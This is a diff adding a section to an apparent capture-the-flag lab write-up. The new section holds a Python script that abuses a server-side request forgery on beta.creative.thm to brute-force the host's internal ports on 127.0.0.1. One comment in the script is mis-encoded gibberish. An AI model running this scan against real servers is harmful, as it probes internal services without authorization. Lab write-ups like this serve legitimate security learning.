@@ -91,6 +91,29 @@ Check `http://beta.creative.thm/`
 
 Looks like we can go to http://127.0.0.1 , but we need port...
 
+Option 1: Bruteforce
+
+```
+import requests
+import time
+
+url = "http://beta.creative.thm"
+
+data_template = "url=http%3A%2F%2F127.0.0.1%3A{}"
+
+def send_post_request(port):
+    data = data_template.format(port)
+    try:
+        response = requests.post(url, data=data, timeout=5)
+        print(f"Port {port}: Status Code {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"Port {port}: Request failed ({e})")
+
+for port in range(1, 65536):
+    send_post_request(port)
+    time.sleep(0.1)  # >102;O5< =51>;LHCN 7045@6:C <564C 70?@>A0<8
+```
+Option 2:
 Check most common ports
 
 ```
